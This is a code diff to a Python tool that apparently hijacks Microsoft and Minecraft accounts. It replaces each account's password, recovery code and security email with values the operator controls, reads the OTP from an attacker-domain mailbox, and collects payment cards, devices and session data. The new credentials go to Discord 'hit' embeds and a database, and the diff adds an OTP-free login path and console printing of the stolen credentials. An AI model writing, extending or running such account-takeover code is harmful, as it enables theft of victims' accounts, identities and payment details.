@@ -1,10 +1,14 @@
 from securing.utils.login_authenticator import login_authenticator
 from securing.utils.cookies.get_livedata import livedata
+from securing.utils.cookies.safe_cookies import has_cookie
 from securing.utils.security.recovery import recover, verify_password_works
 from securing.utils.security.password_gen import generate_ms_password
 from securing.utils.cookies.get_email_code import get_email_code
+from securing.utils.login_pwd import login_pwd
 from securing.secure import startSecuringAccount
 from securing.auth.send_auth import send_auth
+from securing.auth.handle_redirects import handle_redirects, get_data
+from securing.auth.polish_host import polish_host
 
 from securing.build_embeds import build_account_embeds, build_failure_embed
 from securing.auth.initial_session import get_session
@@ -13,11 +17,125 @@ from securing.utils.secure import secure
 
 from database.database import DBConnection
 from time import time
+from typing import Awaitable, Callable
 import logging
 import json
 import uuid
 
 config = json.load(open("config/config.json", "r"))
+
+# Called right after RecoverUser succeeds so the user has credentials even if
+# the later OTP/polish/secure steps hang.
+CredentialsNotify = Callable[[dict], Awaitable[None]]
+
+
+async def _notify_credentials(on_credentials: CredentialsNotify | None, payload: dict) -> None:
+    if not on_credentials:
+        return
+    try:
+        await on_credentials(payload)
+    except Exception:
+        logging.exception("on_credentials notify failed for %s", payload.get("email"))
+
+
+async def _secure_after_password_login(
+    session,
+    email: str,
+    password: str,
+    rextra: dict,
+) -> dict:
+    """Finish securing using the new password (no OTP)."""
+    live = await livedata(session)
+    page = await login_pwd(session, email, live["urlPost"], password, live["ppft"])
+
+    msaauth = get_data(page)
+    if not msaauth:
+        handled = await handle_redirects(session, page)
+        if handled == "Family":
+            return _failure_result(
+                email,
+                "Account is Family Locked.",
+                security_email=rextra.get("security_email"),
+                password=password,
+                recovery_code=rextra.get("recovery_code"),
+            )
+        if isinstance(handled, dict) and handled.get("urlPost"):
+            msaauth = handled
+        elif isinstance(handled, str):
+            msaauth = get_data(handled)
+
+    if not msaauth or not msaauth.get("urlPost"):
+        # Session cookie alone can be enough after password verify — try polish skip path
+        if not (
+            has_cookie(session, "__Host-MSAAUTH")
+            or has_cookie(session, "__Host-MSAAUTHP")
+            or has_cookie(session, "MSPAuth")
+        ):
+            return _failure_result(
+                email,
+                "Password login did not establish an MSAAUTH session.",
+                security_email=rextra.get("security_email"),
+                password=password,
+                recovery_code=rextra.get("recovery_code"),
+            )
+        # Fabricate polish data from a fresh livedata if needed — prefer handle_redirects again
+        return _failure_result(
+            email,
+            "Password accepted but post-login redirect could not be parsed.",
+            security_email=rextra.get("security_email"),
+            password=password,
+            recovery_code=rextra.get("recovery_code"),
+        )
+
+    print("[+] - Got MSAAUTH (password path)")
+    try:
+        await polish_host(session, msaauth)
+    except Exception:
+        logging.exception("polish_host failed on password path")
+        print("[!] - polish_host raised; continuing with existing cookies")
+    print("[~] - Polished MSAAUTH")
+
+    account_info = {
+        "microsoft": {
+            "email": email,
+            "security_email": rextra.get("security_email", "Couldn't Change!"),
+            "password": password,
+            "recovery_code": rextra.get("recovery_code", "Couldn't Change!"),
+            "auth_secret": "Disabled",
+            "firstName": "Failed to Get",
+            "lastName": "Failed to Get",
+            "fullName": "Failed to Get",
+            "region": "Failed to Get",
+            "birthday": "Failed to Get",
+            "language": "Failed to Get",
+            "family": [],
+            "devices": [],
+            "cards": [],
+            "subscriptions": {"active": [], "canceled": [], "commercial": []},
+            "phones": [],
+        },
+        "minecraft": {
+            "name": "No Minecraft",
+            "method": "Not purchased",
+            "gamertag": "Not Found",
+            "uchange": "0 Days",
+            "capes": "No capes",
+            "SSID": False,
+        },
+    }
+
+    secured = await secure(
+        session=session,
+        recovery=False,
+        account_info=account_info,
+        command=True,
+    )
+
+    account_id = uuid.uuid4().hex
+    with DBConnection() as db:
+        db.add_secured_account(account_id, secured)
+
+    return await build_account_embeds(secured, 0, account_id)
 
 
 def _failure_result(
@@ -61,13 +179,18 @@ def _flowtoken_from_auth(info: dict) -> tuple[str | None, str | None]:
     return proofs[0]["data"], None
 
 
-async def recovery_secure(email: str, method: str, data: dict) -> dict:
+async def recovery_secure(
+    email: str,
+    method: str,
+    data: dict,
+    on_credentials: CredentialsNotify | None = None,
+) -> dict:
 
     session = get_session()
 
     account = {
         "microsoft": {
-            "email": "Couldn't Change!",
+            "email": email,
             "security_email": "Couldn't Change!",
             "password": "Couldn't Change!",
             "recovery_code": "Couldn't Change!",
@@ -112,7 +235,8 @@ async def recovery_secure(email: str, method: str, data: dict) -> dict:
                 )
 
             sname = uuid.uuid4().hex[:16]
-            password = generate_ms_password(16)
+            # Letters+digits, mixed case — no symbols
+            password = generate_ms_password(14)
             security_email = f"{sname}@{config["domain"]}"
             print(f"[+] - Generated Security Email ({security_email})")
 
@@ -133,65 +257,100 @@ async def recovery_secure(email: str, method: str, data: dict) -> dict:
                     return None
 
                 print("[+] - Changed password and recovery code")
+                print(f"[+] - New recovery code: {new_recovery_code}")
+                print(f"[+] - Security email: {security_email}")
+                print(f"[+] - Password: {password}")
 
-                # Verify password actually stuck. If not, keep going via OTP but
-                # mark password as unreliable so the hit embed doesn't lie.
-                pwd_status = await verify_password_works(session, email, password)
+                # DM / notify credentials IMMEDIATELY — polish/OTP can hang later
+                # and previously left users with no Discord output after RecoverUser.
+                await _notify_credentials(
+                    on_credentials,
+                    {
+                        "email": email,
+                        "security_email": security_email,
+                        "password": password,
+                        "recovery_code": new_recovery_code,
+                    },
+                )
+
+                # Drop the recovery jar — account.live.com + login.live.com leave
+                # duplicate MSCC cookies that crash httpx. Fresh session for OTP login.
+                try:
+                    await session.aclose()
+                except Exception:
+                    pass
+                session = get_session()
+
+                # Soft verify only — never abort recovery on flaky check.
+                try:
+                    pwd_status = await verify_password_works(session, email, password)
+                except Exception:
+                    logging.exception("Password verify raised for %s", email)
+                    pwd_status = "unknown"
+
                 if pwd_status == "ok":
                     print("[+] - Password verified OK")
                 elif pwd_status == "bad":
                     print("[!] - Password did NOT stick — login will use security-email OTP")
                     logging.error(
-                        "Password not applied for %s after RecoverUser (publicKey/format). "
-                        "Reported password will be marked unreliable.",
+                        "Password not applied for %s after RecoverUser — marking UNVERIFIED",
                         email,
                     )
-                    # Keep the attempted password in the result for debugging, but flag it
                     password = f"{password} (UNVERIFIED — may not work)"
                 else:
                     print("[~] - Password verify inconclusive (continuing)")
 
-                info = await send_auth(session, email, security_email)
-                flowtoken, auth_error = _flowtoken_from_auth(info)
-                if auth_error:
-                    return _failure_result(
-                        email,
-                        auth_error,
-                        security_email=security_email,
-                        password=password,
-                        recovery_code=new_recovery_code,
+                rextra = {
+                    "security_email": security_email,
+                    "password": password,
+                    "recovery_code": new_recovery_code,
+                }
+
+                # Prefer password login when RecoverUser password stuck.
+                # Avoids OTP + fragile livedata parse when we already know the password works.
+                if pwd_status == "ok":
+                    print("[~] - Logging in with new password (skip OTP)...")
+                    account = await _secure_after_password_login(
+                        session, email, password, rextra
                     )
+                else:
+                    info = await send_auth(session, email, security_email)
+                    flowtoken, auth_error = _flowtoken_from_auth(info)
+                    if auth_error:
+                        return _failure_result(
+                            email,
+                            auth_error,
+                            security_email=security_email,
+                            password=password,
+                            recovery_code=new_recovery_code,
+                        )
 
-                print(f"[~] - Getting email code...")
-                code = await get_email_code(security_email)
-                print(f"Got code - {code}")
+                    print(f"[~] - Getting email code...")
+                    code = await get_email_code(security_email)
+                    print(f"Got code - {code}")
 
-                if not code:
-                    return _failure_result(
-                        email,
-                        "Timed out waiting for OTP at the new security email.",
-                        security_email=security_email,
-                        password=password,
-                        recovery_code=new_recovery_code,
+                    if not code:
+                        return _failure_result(
+                            email,
+                            "Timed out waiting for OTP at the new security email.",
+                            security_email=security_email,
+                            password=password,
+                            recovery_code=new_recovery_code,
+                        )
+
+                    live = await livedata(session)
+                    ppft = live["ppft"]
+
+                    account = await startSecuringAccount(
+                        session=session,
+                        email=email,
+                        device=flowtoken,
+                        ppft=ppft,
+                        code=code,
+                        recovery=False,
+                        rextra=rextra,
+                        command=True,
                     )
-
-                live = await livedata(session)
-                ppft = live["ppft"]
-
-                account = await startSecuringAccount(
-                    session = session,
-                    email = email,
-                    device = flowtoken,
-                    ppft = ppft,
-                    code = code,
-                    recovery = False,
-                    rextra = {
-                        "security_email": security_email,
-                        "password": password,
-                        "recovery_code": new_recovery_code
-                    },
-                    command = True
-                )
 
                 if isinstance(account, dict) and account.get("failed"):
                     return _failure_result(
@@ -217,15 +376,27 @@ async def recovery_secure(email: str, method: str, data: dict) -> dict:
             except Exception as exc:
                 logging.exception("recovery_secure rcode failed for %s", email)
                 if new_recovery_code:
+                    # Surface a readable reason — never dump bare AttributeError.group
+                    reason = str(exc).strip() or exc.__class__.__name__
+                    if "has no attribute 'group'" in reason:
+                        reason = (
+                            "Microsoft login page HTML changed — parser missed a field. "
+                            "Credentials above are still valid; retry securing."
+                        )
                     return _failure_result(
                         email,
-                        f"Securing step failed: {exc.__class__.__name__}: {exc}",
+                        f"Securing step failed: {reason}",
                         security_email=security_email,
                         password=password,
                         recovery_code=new_recovery_code,
                         error=f"{exc.__class__.__name__}: {exc}",
                     )
                 raise
+            finally:
+                try:
+                    await session.aclose()
+                except Exception:
+                    pass
             
         case "authpwd":
             lock_reason = await get_account_lock_reason(email)
@@ -237,19 +408,25 @@ async def recovery_secure(email: str, method: str, data: dict) -> dict:
                 )
 
             response = await login_authenticator(
-                session = session,
-                email = email,
-                data = data
+                session=session,
+                email=email,
+                data=data,
             )
 
-            if not response:
-                return "invalid"
-            
+            if response is not True:
+                reason = response if isinstance(response, str) and response else "invalid credentials"
+                return _failure_result(
+                    email,
+                    reason if reason != "invalid" else "invalid credentials",
+                    password=data.get("password"),
+                    error=reason,
+                )
+
             dsecured = await secure(
-                session = session,
-                recovery = True, 
-                account_info = account, 
-                command = True
+                session=session,
+                recovery=True,
+                account_info=account,
+                command=True,
             )
 
     logging.info(f"Account: {dsecured}")
